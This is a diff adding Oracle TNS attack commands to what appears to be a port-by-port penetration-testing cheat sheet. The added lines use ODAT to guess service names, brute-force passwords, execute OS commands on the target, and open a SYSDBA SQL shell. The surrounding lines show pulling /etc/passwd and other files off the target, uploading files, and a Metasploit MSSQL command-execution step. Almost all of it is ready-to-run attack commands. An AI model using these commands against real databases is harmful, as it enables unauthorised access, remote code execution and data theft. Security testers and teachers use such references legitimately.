@@ -699,6 +699,26 @@ msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set 
 sessions -i 1
 
 [*] (1521) OracleTNS
++---------- Find Service Name ----------+
+sudo odat snguesser -s $TARGET
+
++---------- Find Valid Creds ----------+
+echo 'c' | sudo odat passwordguesser -s $TARGET -n XE
+
++---------- Execute Commands ----------+
+sudo odat dbmsscheduler -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --cmd-exe --exec whoami
+
++---------- SQL Shell and Queries----------+
+sudo odat search -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --sysdba --sql-shell
+SELECT * FROM v$version
+SELECT * FROM user_role_privs
+SELECT * FROM user_sys_privs
+SELECT * FROM user_users;
+SELECT username FROM all_users
+SELECT table_name FROM all_tables
+SELECT * FROM tab
+SELECT * FROM EMPLOYEES
+
 +---------- Download Files ----------+
 sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output
 sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output
@@ -707,9 +727,6 @@ sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getF
 
 +---------- Upload Files ----------+
 sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --putFile 'C:\ProgramData\' '' upload.file
-
-
-
 
 [*] (2049) NFS
 +---------- List Mounts ----------+
